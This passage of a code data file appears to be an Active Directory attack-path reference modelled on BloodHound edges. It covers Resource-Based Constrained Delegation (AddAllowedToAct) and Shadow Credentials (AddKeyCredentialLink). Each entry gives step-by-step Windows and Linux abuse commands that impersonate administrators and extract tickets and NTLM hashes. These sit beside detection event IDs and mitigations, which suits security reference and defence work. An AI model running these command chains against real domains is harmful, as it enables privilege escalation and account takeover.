      'The AddAllowedToAct edge indicates that a principal can modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target computer, enabling Resource-Based Constrained Delegation (RBCD). This permission is the specific write access needed to add entries to the RBCD configuration without having full GenericWrite or GenericAll. The attacker can configure a controlled computer account to be trusted for delegation to the target, then use S4U2Self and S4U2Proxy to impersonate privileged users to services on the target.',
    windowsAbuse: `# Step 1: Ensure you control a computer account (create one if MachineAccountQuota > 0)
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Step 2: Get the SID and build the security descriptor
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Step 3: Set the RBCD attribute on the target
Set-DomainObject -Identity targetcomputer$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 4: Perform S4U
Rubeus.exe hash /password:Password123!
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt`,
    linuxAbuse: `# Step 1: Create a machine account
addcomputer.py -computer-name 'FAKECOMPUTER$' -computer-pass 'Password123!' -dc-ip 10.0.0.1 domain.local/attacker:'Password'

# Step 2: Configure RBCD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local add rbcd 'targetcomputer$' 'FAKECOMPUTER$'

# Or using rbcd.py
rbcd.py -delegate-from 'FAKECOMPUTER$' -delegate-to 'targetcomputer$' -action write domain.local/attacker:'Password'

# Step 3: Perform S4U
getST.py -spn cifs/target.domain.local -impersonate administrator -dc-ip 10.0.0.1 domain.local/'FAKECOMPUTER$':'Password123!'

# Step 4: Use the ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass target.domain.local`,
    opsec:
      'The same detection considerations as RBCD apply. Event ID 5136 (A directory service object was modified) with the msDS-AllowedToActOnBehalfOfOtherIdentity attribute is the primary detection point. Machine account creation generates Event ID 4741. S4U operations generate Event ID 4769. Monitor for changes to the RBCD attribute from non-administrative principals and new machine account registrations. Setting MachineAccountQuota to 0 prevents standard users from creating the machine accounts needed for this attack chain.',
    references: [
      {
        title: 'BloodHound Documentation - AddAllowedToAct',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312762397723-AddAllowedToAct',
      },
      {
        title: 'SpecterOps - RBCD',
        url: 'https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a',
      },
      {
        title: 'The Hacker Recipes - RBCD',
        url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd',
      },
    ],
  },
  {
    kind: 'AddKeyCredentialLink',
    category: 'Object Manipulation',
    general:
      'The AddKeyCredentialLink edge indicates that a principal can write to the msDS-KeyCredentialLink attribute on the target object. This attribute is used by Windows Hello for Business (WHfB) and allows a public key to be associated with an account for certificate-based authentication. An attacker who can write to this attribute can perform a "Shadow Credentials" attack: they add their own key pair to the target, then use the corresponding private key to authenticate as the target via PKINIT. This is often preferred over password resets because it does not disrupt the target user\'s access or generate password change events.',
    windowsAbuse: `# Using Whisker to add Shadow Credentials
Whisker.exe add /target:targetuser /domain:domain.local /dc:dc.domain.local

# Whisker outputs a Rubeus command — execute it to get a TGT
Rubeus.exe asktgt /user:targetuser /certificate:<base64-cert> /password:<cert-password> /domain:domain.local /dc:dc.domain.local /getcredentials /show /nowrap

# The /getcredentials flag extracts the NTLM hash via U2U, enabling Pass-the-Hash

# For computer accounts:
Whisker.exe add /target:targetcomputer$ /domain:domain.local /dc:dc.domain.local

# List existing Shadow Credentials
Whisker.exe list /target:targetuser /domain:domain.local /dc:dc.domain.local

# Clean up
Whisker.exe remove /target:targetuser /deviceid:<device-id> /domain:domain.local /dc:dc.domain.local`,
    linuxAbuse: `# Using pywhisker to add Shadow Credentials
python3 pywhisker.py -d domain.local -u attacker -p 'Password' --target targetuser --action add --dc-ip dc.domain.local

# pywhisker outputs a certificate file and password. Use them with getTGT:
getTGT.py domain.local/targetuser -cert-pfx <cert.pfx> -cert-pfx-password <password> -dc-ip dc.domain.local

# Or use certipy for the PKINIT authentication
certipy auth -pfx <cert.pfx> -username targetuser -domain domain.local -dc-ip dc.domain.local

# List existing Shadow Credentials
python3 pywhisker.py -d domain.local -u attacker -p 'Password' --target targetuser --action list --dc-ip dc.domain.local

# Clean up
python3 pywhisker.py -d domain.local -u attacker -p 'Password' --target targetuser --action remove --device-id <device-id> --dc-ip dc.domain.local`,
    opsec:
      'Shadow Credentials modifications generate Event ID 5136 (A directory service object was modified) with the msDS-KeyCredentialLink attribute. The subsequent PKINIT authentication generates Event ID 4768 (A Kerberos authentication ticket was requested) with pre-authentication type 16 (PKINIT) and certificate information. If U2U is used to extract the NTLM hash, an additional Event ID 4768 with PA-FOR-USER is generated. Shadow Credentials attacks do not generate password change events (Event ID 4723/4724), making them stealthier than password resets. Monitor for unexpected modifications to the msDS-KeyCredentialLink attribute and PKINIT authentications from accounts not configured for Windows Hello for Business.',
    references: [
      {
        title: 'BloodHound Documentation - AddKeyCredentialLink',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312762649627-AddKeyCredentialLink',
      },
      {
        title: 'SpecterOps - Shadow Credentials',
        url: 'https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab',
      },
      {
        title: 'The Hacker Recipes - Shadow Credentials',
        url: 'https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials',
      },
    ],
  },
];
